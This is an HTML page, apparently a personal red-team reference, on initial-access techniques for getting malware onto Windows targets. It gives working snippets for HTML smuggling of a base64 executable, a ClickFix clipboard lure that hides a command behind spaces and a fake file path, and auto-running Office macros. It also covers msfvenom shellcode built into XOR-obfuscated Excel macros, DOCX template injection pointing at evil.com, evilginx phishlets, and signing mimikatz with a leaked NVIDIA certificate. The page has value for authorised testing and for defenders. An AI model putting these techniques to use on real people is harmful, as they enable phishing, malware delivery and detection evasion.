@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Initial Access (Red Team) — Corey Clay</title>
+<meta name="description" content="Red-team initial access reference — attack chains (delivery / container / trigger / payload / decoy), ISO/IMG/ZIP/WIM containers, LNK/CHM triggers, Office macros, HTML smuggling, ClickFix / FileFix, code signing.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ other / initial access</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a class="here" href="other.html" aria-current="page">other</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="other.html">&lsaquo; other</a> &nbsp;/&nbsp; // foot-in-the-door</p>
+  <h1>Initial Access (Red Team)</h1>
+  <p>Red-team initial access — the DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY)) pattern that modern intrusions follow, ISO/IMG/ZIP/WIM containers that strip MOTW, LNK/CHM/ClickOnce triggers, payload types (binaries, DLLs, CPL, macros, WSF, MSI, MSIX, ClickOnce), HTML Smuggling, ClickFix / FileFix social engineering, Office macro attacks (DOCM/XLSM/XLM/DOCX template injection), GoPhish, and code signing.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#complex-attack-chains">Complex Attack Chains</a>
+      <a href="#container-formats">Container Formats</a>
+      <a href="#trigger-mechanisms">Trigger Mechanisms</a>
+      <a href="#payload-types">Payload Types</a>
+      <a href="#html-smuggling">HTML Smuggling</a>
+      <a href="#clickfix">ClickFix</a>
+      <a href="#office-macro-attacks">Office Macro Attacks</a>
+      <a href="#phishing-framework-gophish">Phishing Framework - GoPhish</a>
+      <a href="#code-signing">Code Signing</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<p>Initial access in red team exercises refers to the set of files, scripts, executables, or documents used to initially infiltrate the target system or network. These files often contain malicious payloads or exploit specific vulnerabilities to establish a foothold.</p>
+<h2 id="complex-attack-chains">Complex Attack Chains</h2>
+<p>Attack chains follow this pattern: <strong>DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))</strong></p>
+<ul>
+<li><strong>DELIVERY</strong>: means to deliver a pack full of files</li>
+<li>HTML Smuggling, SVG Smuggling, Attachments</li>
+<li><strong>CONTAINER</strong>: archive bundling all infection dependencies</li>
+<li>ISO/IMG, ZIP, WIM</li>
+<li><strong>TRIGGER</strong>: some way to run the payload</li>
+<li>LNK, CHM, ClickOnce applications</li>
+<li><strong>PAYLOAD</strong>: the malware</li>
+<li>Binary Files</li>
+<li>Code Execution Files</li>
+<li>Embedded Files</li>
+<li><strong>DECOY</strong>: used to continue pretext narration after detonating malware</li>
+<li>Typically open PDF files</li>
+</ul>
+<p><strong>Example</strong>: HTML SMUGGLING(PASSWORD PROTECTED ZIP + ISO(LNK + IcedID + PNG)) used by <a href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/">TA551/Storm-0303</a></p>
+<hr />
+<h2 id="container-formats">Container Formats</h2>
+<h3>ISO/IMG</h3>
+<ul>
+<li>Can contain hidden files</li>
+<li>Gets <strong>automounted</strong> giving easy access to contained files</li>
+<li>Execute: <code>powershell –c .\malware.exe</code></li>
+</ul>
+<h3>ZIP</h3>
+<ul>
+<li>Can contain hidden files</li>
+<li>Locate ZIP, unpack it, change dir, run Malware</li>
+</ul>
+<h3>WIM (Windows Image)</h3>
+<p>Builtin format used to deploy system features:</p>
+<pre><code class="language-powershell">## Mount/Unmount .WIM
+Mount-WindowsImage -ImagePath myarchive.wim -Path &quot;C:\output\path\to\extract&quot; -Index 1
+Dismount-WindowsImage -Path &quot;C:\output\path\to\extract&quot; -Discard
+</code></pre>
+<h3>7-zip, RAR, GZ</h3>
+<p>Should get native support on Windows 11</p>
+<hr />
+<h2 id="trigger-mechanisms">Trigger Mechanisms</h2>
+<ul>
+<li><strong>LNK</strong> (shortcuts)</li>
+<li><strong>CHM</strong> (Compiled HTML Help)</li>
+<li><strong>ClickOnce</strong> (application installer)</li>
+</ul>
+<hr />
+<h2 id="payload-types">Payload Types</h2>
+<h3>Binary Files</h3>
+<p>Execute directly on the system without third party:</p>
+<ul>
+<li><strong>.exe</strong>: executable file, run with a click</li>
+<li><strong>.dll</strong>: execute with <code>rundll32 main.dll,DllMain</code></li>
+</ul>
+<pre><code class="language-c">#define WIN32_LEAN_AND_MEAN
+#include &lt;windows.h&gt;
+
+extern &quot;C&quot; __declspec(dllexport)
+DWORD WINAPI MessageBoxThread(LPVOID lpParam) {
+    MessageBox(NULL, &quot;Hello world!&quot;, &quot;Hello World!&quot;, NULL);
+    return 0;
+}
+
+extern &quot;C&quot; __declspec(dllexport)
+BOOL APIENTRY DllMain(HMODULE hModule,
+                    DWORD ul_reason_for_call,
+                    LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+</code></pre>
+<ul>
+<li><strong>.cpl</strong>: Control Panel item with Cplapplet export</li>
+</ul>
+<pre><code class="language-c">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+
+extern &quot;C&quot; __declspec(dllexport) LONG Cplapplet(
+    HWND hwndCpl,
+    UINT msg,
+    LPARAM lParam1,
+    LPARAM lParam2
+) {
+    MessageBoxA(NULL, &quot;Hey there, I am now your control panel item.&quot;, &quot;Control Panel&quot;, 0);
+    return 1;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+                    DWORD ul_reason_for_call,
+                    LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            Cplapplet(NULL, NULL, NULL, NULL);
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+</code></pre>
+<h3>Code Execution Files</h3>
+<ul>
+<li>Word with Macro (.doc, .docm)</li>
+<li>Excel library (.xll)</li>
+<li>Excel macro-enabled add-in file (.xlam)</li>
+</ul>
+<pre><code class="language-powershell">xcopy /Q/R/S/Y/H/G evil.ini %APPDATA%\Microsoft\Excel\XLSTART
+</code></pre>
+<ul>
+<li>WSF files (.wsf)</li>
+<li>MSI installers (.msi)</li>
+</ul>
+<pre><code class="language-powershell">powershell Unblock-File evil.msi; msiexec /q /i .\evil.msi
+</code></pre>
+<ul>
+<li>MSIX/APPX app package (.msix, .appx)</li>
+<li>ClickOnce (.application, .vsto, .appref-ms)</li>
+<li>PowerShell scripts (.ps1)</li>
+<li>Windows Script Host scripts (.wsh, .vbs)</li>
+</ul>
+<pre><code class="language-powershell">cscript.exe payload.vbs
+wscript payload.vbs
+wscript /e:VBScript payload.txt
+</code></pre>
+<h3>Embedded Files</h3>
+<ul>
+<li>ICS Calendar Invites with Embedded Files</li>
+</ul>
+<hr />
+<h2 id="html-smuggling">HTML Smuggling</h2>
+<p>HTML Smuggling consists of making a user navigate to a crafted HTML page which automatically downloads a malicious file.</p>
+<h3>Executable Storage</h3>
+<p>Store payload in a Blob object and create an Object URL:</p>
+<pre><code class="language-javascript">var blob = new Blob([data], {type: 'octet/stream'});
+var url = window.URL.createObjectURL(blob);
+</code></pre>
+<p>Create a hidden <code>&lt;a&gt;</code> tag for download:</p>
+<pre><code class="language-javascript">var a = document.createElement('a');
+document.body.appendChild(a);
+a.style = 'display: none';
+var url = window.URL.createObjectURL(blob);
+a.href = url;
+a.download = fileName;
+a.click();
+window.URL.revokeObjectURL(url);
+</code></pre>
+<p><strong>Encode payload in Base64</strong>:</p>
+<pre><code class="language-javascript">function base64ToArrayBuffer(base64) {
+    var binary_string = window.atob(base64);
+    var len = binary_string.length;
+    var bytes = new Uint8Array(len);
+    for (var i = 0; i &lt; len; i++) {
+        bytes[i] = binary_string.charCodeAt(i);
+    }
+    return bytes.buffer;
+}
+
+var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...';
+var data = base64ToArrayBuffer(file);
+var blob = new Blob([data], {type: 'octet/stream'});
+var fileName = 'NotAMalware.exe';
+</code></pre>
+<hr />
+<h2 id="clickfix">ClickFix</h2>
+<p>ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code through the Run Dialog.</p>
+<h3>FileFix Variant</h3>
+<p>Display a message luring the user into copying and pasting a command in a shell:</p>
+<pre><code>To access the file, follow these steps:
+1. Copy the file path below:
+   C:\company\internal-secure\filedrive\HRPolicy.docx
+2. Open File Explorer and select the address bar (CTRL + L)
+3. Paste the file path and press Enter
+</code></pre>
+<p>When the user clicks "COPY", set clipboard to:</p>
+<pre><code class="language-powershell">navigator.clipboard.writeText(&quot;powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    &quot;);
+</code></pre>
+<p><strong>Tricks</strong>:</p>
+<ul>
+<li>Multiple spaces to hide the start of the payload</li>
+<li>Comment with <code>#</code> containing a fake path to the document</li>
+</ul>
+<p><strong>Note</strong>: Executable files executed through File Explorer's address bar have their Mark Of The Web (MOTW) attribute removed.</p>
+<hr />
+<h2 id="office-macro-attacks">Office Macro Attacks</h2>
+<h3>XLSM - Hot Manchego</h3>
+<p>Generate CS Macro and save as vba.txt:</p>
+<pre><code class="language-powershell">New-Item blank.xlsm
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
+.\hot-manchego.exe .\blank.xlsm .\vba.txt
+</code></pre>
+<h3>XLM - Macrome</h3>
+<p>XOR Obfuscation technique for Excel 4.0 macros (VBA won't work):</p>
+<pre><code class="language-bash">## Generate shellcode
+msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread &gt; popcalc.bin
+msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread &gt; popcalc64.bin
+
+## Build document
+dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin
+
+## With password (VelvetSweatshop is auto-decrypted)
+Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
+</code></pre>
+<h3>DOCM - VBA Wscript</h3>
+<pre><code class="language-vb">Sub parent_change()
+    Dim objOL
+    Set objOL = CreateObject(&quot;Outlook.Application&quot;)
+    Set shellObj = objOL.CreateObject(&quot;Wscript.Shell&quot;)
+    shellObj.Run(&quot;notepad.exe&quot;)
+End Sub
+Sub AutoOpen()
+    parent_change
+End Sub
+</code></pre>
+<h3>DOCM - WMI COM Functions</h3>
+<p>Basic WMI execution (detected by Defender):</p>
+<pre><code class="language-vb">Sub wmi_exec()
+    strComputer = &quot;.&quot;
+    Set objWMIService = GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)
+    Set objStartUp = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)
+    Set objProc = objWMIService.Get(&quot;Win32_Process&quot;)
+    Set procStartConfig = objStartUp.SpawnInstance_
+    procStartConfig.ShowWindow = 1
+    objProc.Create &quot;powershell.exe&quot;, Null, procStartConfig, intProcessID
+End Sub
+</code></pre>
+<h3>DOCX - Template Injection</h3>
+<p>Template injection does <strong>not</strong> require "Enable Macro".</p>
+<ol>
+<li>Create malicious macro in .dotm template file</li>
+<li>Create benign .docx file</li>
+<li>Save as .docx, rename to .zip, unzip</li>
+<li>Edit <code>.\word_rels\settings.xml.rels</code> to reference malicious template (HTTP or WebDAV):</li>
+</ol>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;
+    &lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;https://evil.com/malicious.dotm&quot; TargetMode=&quot;External&quot;/&gt;
+&lt;/Relationships&gt;
+</code></pre>
+<ol start="5">
+<li>Zip back up and rename to .docx</li>
+</ol>
+<p><strong>Tools</strong>:</p>
+<ul>
+<li><a href="https://github.com/JohnWoodman/remoteInjector">JohnWoodman/remoteInjector</a></li>
+<li><a href="https://github.com/ryhanson/phishery">ryhanson/phishery</a></li>
+</ul>
+<pre><code class="language-bash">phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
+</code></pre>
+<hr />
+<h2 id="phishing-framework-gophish">Phishing Framework - GoPhish</h2>
+<p><a href="https://github.com/gophish/gophish">gophish/gophish</a> - Open-Source Phishing Toolkit</p>
+<p><strong>Build</strong>:</p>
+<pre><code class="language-bash">git clone https://github.com/gophish/gophish.git
+go build
+</code></pre>
+<p><strong>IOC Detection</strong>:</p>
+<ul>
+<li><code>X-Gophish-Contact</code> and <code>X-Gophish-Signature</code> headers</li>
+<li>Default server name: "gophish"</li>
+<li>Default <code>rid</code> parameter</li>
+</ul>
+<p><strong>Evasion</strong> (<a href="https://github.com/kgretzky/evilginx2">kgretzky/evilginx2</a>):</p>
+<pre><code class="language-bash">phishlets          # List available phishlets
+phishlets enable &lt;phishlet_name&gt;
+phishlets disable &lt;phishlet_name&gt;
+</code></pre>
+<hr />
+<h2 id="code-signing">Code Signing</h2>
+<p>Certificates can be <strong>Expired</strong>, <strong>Revoked</strong>, or <strong>Valid</strong>.</p>
+<p>Many certificates are leaked and re-used by threat actors. Find them on VirusTotal with: <code>content:{02 01 03 30}@4 AND NOT tag:peexe</code></p>
+<p><strong>Password-protected certificates</strong>:</p>
+<pre><code class="language-bash">john --wordlist=/opt/wordlists/rockyou.txt --format=pfx pfx.hashes
+</code></pre>
+<p><strong>Sign binary with certificate</strong>:</p>
+<pre><code class="language-bash">osslsigncode sign -pkcs12 certs/nvidia-2014.pfx -in mimikatz.exe -out signed-mimikatz.exe -pass nv1d1aRules
+</code></pre>
+<p><strong>Signable file types</strong>:</p>
+<ul>
+<li>Executables: .exe, .dll, .ocx, .xll, .wll</li>
+<li>Scripts: .vbs, .js, .ps1</li>
+<li>Installers: .msi, .msix, .appx, .msixbundle, .appxbundle</li>
+<li>Drivers: .sys</li>
+<li>Cabinets: .cab</li>
+<li>ClickOnce: .application, .manifest, .vsto</li>
+</ul>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://blog.delivr.to/delivr-tos-top-10-payloads-highlighting-notable-and-trending-techniques-fb5e9fdd9356">Top 10 Payloads: Highlighting Notable and Trending Techniques - delivr.to</a></li>
+<li><a href="https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function">Executing Code as a Control Panel Item through Cplapplet - @spotheplanet</a></li>
+<li><a href="https://youtu.be/CwNPP_Xfrts">Desperate Infection Chains - Mariusz Banach - x33fcon</a></li>
+<li><a href="https://binary-offensive.com/initial-access-framework">Red Macros Factory - binary-offensive.com</a></li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — other / initial access · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="other.html">other</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
